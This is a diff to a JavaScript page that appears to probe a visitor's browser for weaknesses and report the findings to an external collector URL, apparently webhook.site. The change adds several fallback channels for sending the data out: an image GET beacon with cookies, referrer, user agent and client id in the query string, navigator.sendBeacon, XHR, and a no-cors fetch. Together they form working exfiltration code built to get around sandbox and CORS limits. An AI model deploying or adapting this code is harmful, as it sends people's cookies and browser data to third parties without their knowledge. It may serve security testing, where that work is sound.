@@ -175,36 +175,61 @@
       return;
     }
 
-    exfilStatus.textContent = "POSTing to " + COLLECTOR_URL + " …";
+    exfilStatus.innerHTML = "Attempting beacon via 3 methods…";
 
-    // Use XHR — more reliable than fetch(no-cors) inside sandboxed iframes.
-    // XHR uses CORS mode (preflight + actual request); webhook.site supports CORS out of the box.
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", COLLECTOR_URL, true);
-    xhr.setRequestHeader("Content-Type", "application/json");
-    xhr.onload = function() {
-      exfilStatus.textContent = "✓ Beacon sent (HTTP " + xhr.status + ") to " + COLLECTOR_URL +
+    var sent = false;
+
+    function markSent(method) {
+      if (sent) return;
+      sent = true;
+      exfilStatus.textContent = "✓ Beacon dispatched (" + method + ") → " + COLLECTOR_URL +
                                 " at " + new Date().toISOString();
       exfilStatus.style.color = "var(--vuln)";
-    };
-    xhr.onerror = function() {
-      // Fall back to no-cors fetch (for collectors without CORS headers)
-      fetch(COLLECTOR_URL, {
-        method: "POST",
-        headers: { "Content-Type": "text/plain" },
-        body: payloadStr,
-        mode: "no-cors"
-      }).then(function() {
-        exfilStatus.textContent = "✓ Beacon sent (no-cors fallback) to " + COLLECTOR_URL +
-                                  " at " + new Date().toISOString();
-        exfilStatus.style.color = "var(--vuln)";
-      }).catch(function(e) {
-        exfilStatus.textContent = "POST failed: " + e.message +
-                                  " — data displayed above only. Check collector CORS headers.";
-        exfilStatus.style.color = "var(--warn)";
-      });
-    };
-    xhr.send(payloadStr);
+    }
+
+    function markFailed(detail) {
+      exfilStatus.textContent = "✗ All beacon methods failed. " + detail +
+                                " — Data displayed above. Check DevTools Network tab.";
+      exfilStatus.style.color = "var(--warn)";
+    }
+
+    // ── Method 1: Image GET beacon (works in every sandboxed context, no CORS needed) ──
+    // Webhook.site shows GET requests. Full payload in POST, summary in GET query string.
+    var compact = JSON.stringify({
+      ts: beacon.ts,
+      client: beacon.client && beacon.client.id,
+      referrer: beacon.referrer,
+      ua: (beacon.userAgent || "").slice(0, 80),
+      cookies: (beacon.cookies || "").slice(0, 100),
+      vuln: (beacon.probes || []).filter(function(p) { return p.status === "VULN"; }).map(function(p) { return p.name.slice(0,30); })
+    });
+    var img = new Image();
+    img.onload = img.onerror = function() { markSent("img-GET"); };
+    img.src = COLLECTOR_URL + "?_b=" + encodeURIComponent(compact) + "&_t=" + Date.now();
+
+    // ── Method 2: sendBeacon (POST, works in modern browsers from sandboxed iframes) ──
+    if (navigator.sendBeacon) {
+      try {
+        var blob = new Blob([payloadStr], { type: "application/json" });
+        var queued = navigator.sendBeacon(COLLECTOR_URL, blob);
+        if (queued) { markSent("sendBeacon-POST"); }
+      } catch(e) { /* ignore, fall through */ }
+    }
+
+    // ── Method 3: XHR with CORS (webhook.site supports CORS) ──
+    try {
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", COLLECTOR_URL, true);
+      xhr.setRequestHeader("Content-Type", "application/json");
+      xhr.onload  = function() { markSent("XHR-POST HTTP " + xhr.status); };
+      xhr.onerror = function() {
+        // Final fallback: no-cors fetch
+        fetch(COLLECTOR_URL, { method: "POST", headers: { "Content-Type": "text/plain" }, body: payloadStr, mode: "no-cors" })
+          .then(function() { markSent("fetch-no-cors"); })
+          .catch(function(e) { if (!sent) markFailed(e.message); });
+      };
+      xhr.send(payloadStr);
+    } catch(e) { if (!sent) markFailed(e.message); }
   }
 
   // ── Run probes ────────────────────────────────────────────────────
